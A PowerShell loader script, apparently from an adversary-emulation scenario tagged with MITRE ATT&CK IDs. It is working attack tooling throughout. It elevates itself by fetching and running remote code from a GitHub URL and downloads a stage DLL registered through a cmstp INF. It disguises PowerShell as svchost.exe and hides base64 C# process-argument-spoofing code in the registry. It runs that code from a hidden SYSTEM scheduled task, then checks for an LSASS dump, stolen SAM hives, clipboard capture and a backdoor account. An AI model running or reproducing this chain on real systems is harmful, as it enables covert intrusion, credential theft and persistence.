param()

# -- CONFIG: set this to the raw URL of the directory containing stage.dll --
#   i.e. the 'github/' folder uploaded to your repo (see Makefile sync target)
#   Example: https://raw.githubusercontent.com/<user>/<repo>/main/scenario-01-rmm/github
$scriptBase = "https://github.com/Justanother-engineer/scenario1/raw/refs/heads/main"

# -- Elevation Gate ----------------------------------------------
$isAdmin = [Security.Principal.WindowsPrincipal]::new(
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[!] Not admin. Requesting elevation via UAC..."
    $scriptUrl = "$scriptBase/loader.ps1?t=$(Get-Date -Format 'yyyyMMddHHmmss')"
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
        "iex((New-Object Net.WebClient).DownloadString('$scriptUrl'))"
    ))
    Start-Process powershell -Verb RunAs -ArgumentList "-NoP -Exec Bypass -Enc $b64"
    exit
}

Write-Host "[*] Running with admin privileges. Proceeding..."

# -- Logging -----------------------------------------------------
$logFile = "C:\ProgramData\loader.log"
function Write-Log($msg) {
    $parent = Split-Path $logFile -Parent
    if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
    "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg" | Out-File $logFile -Append
}

Write-Log "[*] loader.ps1 started - admin=True"

# Configuration
$githubBase = $scriptBase
$stageUrl = "$githubBase/stage.dll"
$stagePath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\stage.dll"
$infPath = "C:\ProgramData\config.inf"
$masqueradeSrc = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$masqueradeDst = "C:\ProgramData\Microsoft\Windows\Caches\svchost.exe"
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer"
$regName = "App"
$taskName = "SecHealthSvc"

# Create scatter directories
Write-Log "[*] Creating scatter directories..."
try {
    New-Item -Path "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18" -ItemType Directory -Force -ErrorAction Stop | Out-Null
    New-Item -Path "C:\ProgramData\Microsoft\Windows\Caches" -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Write-Log "[+] Scatter directories created"
} catch {
    Write-Log "[-] Failed to create scatter directories: $_"
}

# 1. Download stage.dll
Write-Host "[*] Downloading stage.dll..."
Write-Log "[*] Downloading stage.dll from $stageUrl"
try {
    Invoke-WebRequest -Uri $stageUrl -OutFile $stagePath -UseBasicParsing -ErrorAction Stop
    if (Test-Path $stagePath) {
        $bytes = (Get-Item $stagePath).Length
        Write-Log "[+] stage.dll downloaded - $bytes bytes (verified)"
    } else {
        Write-Log "[-] stage.dll download FAILED: file not found after download"
    }
} catch {
    Write-Log "[-] stage.dll download FAILED: $_"
}

# 2. Write config.inf
Write-Log "[*] Writing config.inf..."
$infContent = @"
[version]
Signature=`$chicago$
AdvancedINF=2.5

[DefaultInstall]
RegisterOCXs=RegisterStage

[RegisterStage]
$stagePath
"@
try {
    Set-Content -Path $infPath -Value $infContent -Force -ErrorAction Stop
    if (Test-Path $infPath) {
        Write-Log "[+] config.inf written - verified"
    } else {
        Write-Log "[-] config.inf write FAILED: file not found after write"
    }
} catch {
    Write-Log "[-] config.inf write FAILED: $_"
}

# 3. Masquerade PowerShell
Write-Log "[*] Masquerading PowerShell -> svchost.exe..."
try {
    Copy-Item -Path $masqueradeSrc -Destination $masqueradeDst -Force -ErrorAction Stop
    if (Test-Path $masqueradeDst) {
        $mbytes = (Get-Item $masqueradeDst).Length
        Write-Log "[+] Masquerade OK - $masqueradeDst ($mbytes bytes)"
    } else {
        Write-Log "[-] Masquerade FAILED: file not found after copy"
    }
} catch {
    Write-Log "[-] Masquerade FAILED: $_"
}

# 4. Stage C# execution wrapper in HKLM
Write-Log "[*] Encoding C# source and writing registry payload..."
$spoofBase64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5JTzsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgU3lzdGVtLlRocmVhZGluZzsKCnB1YmxpYyBzdGF0aWMgY2xhc3MgU3Bvb2YKewogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDcmVhdGVQcm9jZXNzVygKICAgICAgICBzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsCiAgICAgICAgc3RyaW5nIGxwQ29tbWFuZExpbmUsCiAgICAgICAgSW50UHRyIGxwUHJvY2Vzc0F0dHJpYnV0ZXMsCiAgICAgICAgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywKICAgICAgICBib29sIGJJbmhlcml0SGFuZGxlcywKICAgICAgICB1aW50IGR3Q3JlYXRpb25GbGFncywKICAgICAgICBJbnRQdHIgbHBFbnZpcm9ubWVudCwKICAgICAgICBzdHJpbmcgbHBDdXJyZW50RGlyZWN0b3J5LAogICAgICAgIHJlZiBTVEFSVFVQSU5GTyBscFN0YXJ0dXBJbmZvLAogICAgICAgIG91dCBQUk9DRVNTX0lORk9STUFUSU9OIGxwUHJvY2Vzc0luZm9ybWF0aW9uKTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgTnRRdWVyeUluZm9ybWF0aW9uUHJvY2VzcygKICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgaW50IFByb2Nlc3NJbmZvcm1hdGlvbkNsYXNzLAogICAgICAgIG91dCBQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OIHBiaSwKICAgICAgICBpbnQgY2IsCiAgICAgICAgb3V0IGludCByZXR1cm5MZW5ndGgpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgUmVhZFByb2Nlc3NNZW1vcnkoCiAgICAgICAgSW50UHRyIGhQcm9jZXNzLAogICAgICAgIEludFB0ciBscEJhc2VBZGRyZXNzLAogICAgICAgIFtPdXRdIGJ5dGVbXSBscEJ1ZmZlciwKICAgICAgICBpbnQgZHdTaXplLAogICAgICAgIG91dCBpbnQgbHBOdW1iZXJPZkJ5dGVzUmVhZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZVByb2Nlc3NNZW1vcnkoCiAgICAgICAgSW50UHRyIGhQcm9jZXNzLAogICAgICAgIEludFB0ciBscEJhc2VBZGRyZXNzLAogICAgICAgIGJ5dGVbXSBscEJ1ZmZlciwKICAgICAgICBpbnQgZHdTaXplLAogICAgICAgIG91dCBpbnQgbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbik7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gdWludCBSZXN1bWVUaHJlYWQoSW50UHRyIGhUaHJlYWQpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoSW50UHRyIGhPYmplY3QpOwoKICAgIHByaXZhdGUgY29uc3QgdWludCBDUkVBVEVfU1VTUEVOREVEID0gMHgwMDAwMDAwNDsKICAgIHByaXZhdGUgY29uc3QgaW50IFByb2Nlc3NCYXNpY0luZm9ybWF0aW9uID0gMDsKCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICBwcml2YXRlIHN0cnVjdCBTVEFSVFVQSU5GTwogICAgewogICAgICAgIHB1YmxpYyBpbnQgY2I7CiAgICAgICAgcHVibGljIHN0cmluZyBscFJlc2VydmVkOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBEZXNrdG9wOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBUaXRsZTsKICAgICAgICBwdWJsaWMgaW50IGR3WDsKICAgICAgICBwdWJsaWMgaW50IGR3WTsKICAgICAgICBwdWJsaWMgaW50IGR3WFNpemU7CiAgICAgICAgcHVibGljIGludCBkd1lTaXplOwogICAgICAgIHB1YmxpYyBpbnQgZHdYQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgaW50IGR3WUNvdW50Q2hhcnM7CiAgICAgICAgcHVibGljIGludCBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgcHVibGljIGludCBkd0ZsYWdzOwogICAgICAgIHB1YmxpYyBzaG9ydCB3U2hvd1dpbmRvdzsKICAgICAgICBwdWJsaWMgc2hvcnQgY2JSZXNlcnZlZDI7CiAgICAgICAgcHVibGljIEludFB0ciBscFJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRJbnB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRPdXRwdXQ7CiAgICAgICAgcHVibGljIEludFB0ciBoU3RkRXJyb3I7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgUFJPQ0VTU19JTkZPUk1BVElPTgogICAgewogICAgICAgIHB1YmxpYyBJbnRQdHIgaFByb2Nlc3M7CiAgICAgICAgcHVibGljIEludFB0ciBoVGhyZWFkOwogICAgICAgIHB1YmxpYyBpbnQgZHdQcm9jZXNzSWQ7CiAgICAgICAgcHVibGljIGludCBkd1RocmVhZElkOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04KICAgIHsKICAgICAgICBwdWJsaWMgSW50UHRyIEV4aXRTdGF0dXM7CiAgICAgICAgcHVibGljIEludFB0ciBQZWJCYXNlQWRkcmVzczsKICAgICAgICBwdWJsaWMgSW50UHRyIEFmZmluaXR5TWFzazsKICAgICAgICBwdWJsaWMgSW50UHRyIEJhc2VQcmlvcml0eTsKICAgICAgICBwdWJsaWMgSW50UHRyIFVuaXF1ZVByb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgSW50UHRyIEluaGVyaXRlZEZyb21VbmlxdWVQcm9jZXNzSWQ7CiAgICB9CgogICAgcHJpdmF0ZSBjb25zdCBpbnQgQ29tbWFuZExpbmVPZmZzZXQgPSAweDcwOwoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgTG9nKHN0cmluZyBtc2cpCiAgICB7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBzdHJpbmcgbG9nUGF0aCA9IEAiQzpcUHJvZ3JhbURhdGFcbG9hZGVyLmxvZyI7CiAgICAgICAgICAgIHN0cmluZyBsaW5lID0gRGF0ZVRpbWUuTm93LlRvU3RyaW5nKCJbeXl5eS1NTS1kZCBISDptbTpzc10gIikgKyBtc2c7CiAgICAgICAgICAgIEZpbGUuQXBwZW5kQWxsVGV4dChsb2dQYXRoLCBsaW5lICsgRW52aXJvbm1lbnQuTmV3TGluZSwgRW5jb2RpbmcuVW5pY29kZSk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsgfQogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBHbygpCiAgICB7CiAgICAgICAgc3RyaW5nIHNwb29mZWRDbWQgPSAiY21zdHAuZXhlIC9hdSAvcyBDOlxcV2luZG93c1xcU3lzdGVtMzJcXGNtc3RwLmluZiI7CiAgICAgICAgc3RyaW5nIHJlYWxDbWQgPSAiY21zdHAuZXhlIC9hdSAvcyBDOlxcUHJvZ3JhbURhdGFcXGNvbmZpZy5pbmYiOwoKICAgICAgICBTVEFSVFVQSU5GTyBzaSA9IG5ldyBTVEFSVFVQSU5GTygpOwogICAgICAgIHNpLmNiID0gTWFyc2hhbC5TaXplT2YodHlwZW9mKFNUQVJUVVBJTkZPKSk7CgogICAgICAgIFBST0NFU1NfSU5GT1JNQVRJT04gcGk7CgogICAgICAgIExvZygiWypdIENyZWF0aW5nIHN1c3BlbmRlZCBjbXN0cC5leGUuLi4iKTsKICAgICAgICBpZiAoIUNyZWF0ZVByb2Nlc3NXKG51bGwsIHNwb29mZWRDbWQsIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybywgZmFsc2UsCiAgICAgICAgICAgIENSRUFURV9TVVNQRU5ERUQsIEludFB0ci5aZXJvLCBudWxsLCByZWYgc2ksIG91dCBwaSkpCiAgICAgICAgewogICAgICAgICAgICBpbnQgZXJyID0gTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpOwogICAgICAgICAgICBMb2coIlstXSBDcmVhdGVQcm9jZXNzVyBGQUlMRUQgKGVycm9yICIgKyBlcnIgKyAiKSIpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIExvZygiWytdIGNtc3RwLmV4ZSBjcmVhdGVkIChQSUQ9IiArIHBpLmR3UHJvY2Vzc0lkICsgIikiKTsKCiAgICAgICAgaW50IHJldExlbjsKICAgICAgICBQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OIHBiaTsKICAgICAgICBpZiAoTnRRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhwaS5oUHJvY2VzcywgUHJvY2Vzc0Jhc2ljSW5mb3JtYXRpb24sCiAgICAgICAgICAgIG91dCBwYmksIE1hcnNoYWwuU2l6ZU9mKHR5cGVvZihQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OKSksCiAgICAgICAgICAgIG91dCByZXRMZW4pICE9IDApCiAgICAgICAgewogICAgICAgICAgICBMb2coIlstXSBOdFF1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzIEZBSUxFRCIpOwogICAgICAgICAgICBSZXN1bWVUaHJlYWQocGkuaFRocmVhZCk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgTG9nKCJbK10gUEVCIGxvY2F0ZWQiKTsKCiAgICAgICAgYnl0ZVtdIHBlYkJ1ZmZlciA9IG5ldyBieXRlW0ludFB0ci5TaXplICogNV07CiAgICAgICAgaW50IGJ5dGVzUmVhZDsKICAgICAgICBpZiAoIVJlYWRQcm9jZXNzTWVtb3J5KHBpLmhQcm9jZXNzLCBwYmkuUGViQmFzZUFkZHJlc3MsIHBlYkJ1ZmZlciwgcGViQnVmZmVyLkxlbmd0aCwgb3V0IGJ5dGVzUmVhZCkpCiAgICAgICAgewogICAgICAgICAgICBMb2coIlstXSBSZWFkUHJvY2Vzc01lbW9yeShQRUIpIEZBSUxFRCIpOwogICAgICAgICAgICBSZXN1bWVUaHJlYWQocGkuaFRocmVhZCk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgTG9nKCJbK10gUEVCIHJlYWQiKTsKCiAgICAgICAgaW50IHBwT2Zmc2V0ID0gSW50UHRyLlNpemUgPT0gOCA/IDB4MjAgOiAweDEwOwogICAgICAgIEludFB0ciBwcm9jZXNzUGFyYW1ldGVyc1B0ciA9IE1hcnNoYWwuUmVhZEludFB0cihwZWJCdWZmZXIsIHBwT2Zmc2V0KTsKICAgICAgICBMb2coIlsrXSBQcm9jZXNzUGFyYW1ldGVycyByZXNvbHZlZCIpOwoKICAgICAgICBieXRlW10gY21kQnVmZmVyID0gbmV3IGJ5dGVbMTZdOwogICAgICAgIGlmICghUmVhZFByb2Nlc3NNZW1vcnkocGkuaFByb2Nlc3MsIEludFB0ci5BZGQocHJvY2Vzc1BhcmFtZXRlcnNQdHIsIENvbW1hbmRMaW5lT2Zmc2V0KSwgY21kQnVmZmVyLCBjbWRCdWZmZXIuTGVuZ3RoLCBvdXQgYnl0ZXNSZWFkKSkKICAgICAgICB7CiAgICAgICAgICAgIExvZygiWy1dIFJlYWRQcm9jZXNzTWVtb3J5KGNtZFB0cikgRkFJTEVEIik7CiAgICAgICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBMb2coIlsrXSBDb21tYW5kIGxpbmUgcG9pbnRlciByZWFkIik7CgogICAgICAgIGJ5dGVbXSBuZXdDbWRCeXRlcyA9IEVuY29kaW5nLlVuaWNvZGUuR2V0Qnl0ZXMocmVhbENtZCk7CiAgICAgICAgSW50UHRyIGJ1ZmZlclB0ciA9IE1hcnNoYWwuUmVhZEludFB0cihjbWRCdWZmZXIsIDgpOwoKICAgICAgICBpbnQgd3JpdHRlbjsKICAgICAgICBpZiAoIVdyaXRlUHJvY2Vzc01lbW9yeShwaS5oUHJvY2VzcywgYnVmZmVyUHRyLCBuZXdDbWRCeXRlcywgbmV3Q21kQnl0ZXMuTGVuZ3RoLCBvdXQgd3JpdHRlbikpCiAgICAgICAgewogICAgICAgICAgICBMb2coIlstXSBXcml0ZVByb2Nlc3NNZW1vcnkoY21kKSBGQUlMRUQiKTsKICAgICAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIExvZygiWytdIENvbW1hbmQgbGluZSBvdmVyd3JpdHRlbjogY29uZmlnLmluZiIpOwoKICAgICAgICBieXRlW10gbGVuZ3RoQnl0ZXMgPSBCaXRDb252ZXJ0ZXIuR2V0Qnl0ZXMobmV3Q21kQnl0ZXMuTGVuZ3RoKTsKICAgICAgICBieXRlW10gbWF4TGVuZ3RoQnl0ZXMgPSBCaXRDb252ZXJ0ZXIuR2V0Qnl0ZXMobmV3Q21kQnl0ZXMuTGVuZ3RoKTsKICAgICAgICBCdWZmZXIuQmxvY2tDb3B5KGxlbmd0aEJ5dGVzLCAwLCBjbWRCdWZmZXIsIDAsIDIpOwogICAgICAgIEJ1ZmZlci5CbG9ja0NvcHkobWF4TGVuZ3RoQnl0ZXMsIDAsIGNtZEJ1ZmZlciwgMiwgMik7CiAgICAgICAgV3JpdGVQcm9jZXNzTWVtb3J5KHBpLmhQcm9jZXNzLCBJbnRQdHIuQWRkKHByb2Nlc3NQYXJhbWV0ZXJzUHRyLCBDb21tYW5kTGluZU9mZnNldCksIGNtZEJ1ZmZlciwgY21kQnVmZmVyLkxlbmd0aCwgb3V0IHdyaXR0ZW4pOwogICAgICAgIExvZygiWytdIENvbW1hbmQgbGluZSBsZW5ndGggdXBkYXRlZCIpOwoKICAgICAgICBMb2coIlsqXSBSZXN1bWluZyBjbXN0cC5leGUgdGhyZWFkLi4uIik7CiAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgIExvZygiWypdIFdhdGNoaW5nIGNtc3RwLmV4ZSBmb3IgM3MuLi4iKTsKICAgICAgICBUaHJlYWQuU2xlZXAoMzAwMCk7CiAgICAgICAgUHJvY2Vzc1tdIHByb2NzID0gUHJvY2Vzcy5HZXRQcm9jZXNzZXNCeU5hbWUoImNtc3RwIik7CiAgICAgICAgaWYgKHByb2NzLkxlbmd0aCA+IDApIHsKICAgICAgICAgICAgTG9nKCJbK10gY21zdHAuZXhlIGFsaXZlIGFmdGVyIDNzIChQSUQ9IiArIHByb2NzWzBdLklkICsgIikgLSBJTkYgYWNjZXB0ZWQiKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBMb2coIlstXSBjbXN0cC5leGUgZXhpdGVkIHdpdGhpbiAzcyAtIElORiBwcm9jZXNzaW5nIGxpa2VseSBmYWlsZWQiKTsKICAgICAgICAgICAgTG9nKCJbLV0gQ2hlY2sgV2luZG93cyBFdmVudCBMb2cgLT4gQXBwbGljYXRpb24gZm9yIGNtc3RwLmV4ZSBlcnJvcnMiKTsKICAgICAgICB9CiAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwogICAgICAgIExvZygiWytdIGNtc3RwLmV4ZSByZXN1bWVkLCBhcmd1bWVudCBzcG9vZmluZyBjb21wbGV0ZSIpOwogICAgfQp9Cg=="
$spoofBytes = [Convert]::FromBase64String($spoofBase64)
$spoofSource = [Text.Encoding]::UTF8.GetString($spoofBytes)

# Wrap C# in Add-Type so iex will compile + call it
$regValue = @"
function Get-Ts { [DateTime]::Now.ToString('[yyyy-MM-dd HH:mm:ss]') }

"`$(Get-Ts) [*] Task payload executing (svchost.exe)" | Out-File C:\ProgramData\loader.log -Append
try {
    "`$(Get-Ts) [*] Compiling C# (Add-Type)..." | Out-File C:\ProgramData\loader.log -Append
    Add-Type -TypeDefinition @'
$spoofSource
'@ -Language CSharp
    "`$(Get-Ts) [+] C# compiled successfully, calling Spoof::Go()" | Out-File C:\ProgramData\loader.log -Append
    [Spoof]::Go()
    "`$(Get-Ts) [+] Spoof::Go() completed" | Out-File C:\ProgramData\loader.log -Append
} catch {
    "`$(Get-Ts) [-] Task payload FAILED: `$_" | Out-File C:\ProgramData\loader.log -Append
    "`$(Get-Ts) [-] Type: `$(`$_.Exception.GetType().FullName)" | Out-File C:\ProgramData\loader.log -Append
}
"@

if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
$checkVal = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
if ($checkVal) {
    Write-Log "[+] Registry payload stored at $regPath\$regName - $($checkVal.Length) chars (verified)"
} else {
    Write-Log "[-] Registry payload FAILED"
}

# 5. Create scheduled task with dynamic time via Register-ScheduledTask
Write-Log "[*] Creating scheduled task (Register-ScheduledTask)..."
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
    "iex(gp '$regPath').$regName"
))
$action = New-ScheduledTaskAction -Execute $masqueradeDst -Argument "-NoP -Enc $b64"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit ([TimeSpan]::FromMinutes(5))
try {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
    Write-Log "[+] Task $taskName created (verified)"
    Write-Host "[+] Scheduled. Waiting 2m for execution..."
    Start-ScheduledTask -TaskName $taskName
    Write-Log "[*] Task $taskName triggered"
} catch {
    Write-Log "[-] Task creation FAILED`n$_"
}

# 6. Wait for post-ex artifacts (chain runs in <30s, wait 90s for safety)
Write-Log "[*] Task $taskName triggered, waiting 90s for post-ex artifacts..."
Start-Sleep -Seconds 90

$artifacts = @{
    "T1003.001 LSASS dump"     = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\~adf.bin"
    "T1003.002 SAM hive"       = "C:\Windows\Temp\~s1.tmp"
    "T1003.002 SYSTEM hive"    = "C:\Windows\Temp\~s2.tmp"
    "T1082/T1057 Recon"        = "C:\ProgramData\Microsoft\Network\~df.tmp"
    "T1018/T1135 SMB recon"    = "C:\ProgramData\Microsoft\Network\~net.tmp"
    "T1115 Clipboard capture"  = "C:\ProgramData\Microsoft\Network\~clip.tmp"
    "T1547.001 Run key"        = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecHealth"
    "T1053.005 Task persist"   = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\SecHealthSvc2"
    "T1136.001 SupportUser"    = "HKLM:\SAM\SAM\Domains\Account\Users\Names\SupportUser"
}

foreach ($k in $artifacts.Keys) {
    $path = $artifacts[$k]
    $isReg = $path -match '^HKLM:'
    $ok = $isReg -or (Test-Path $path)
    Write-Log (($ok ? "[+] " : "[-] ") + $k + " : " + $path)
}
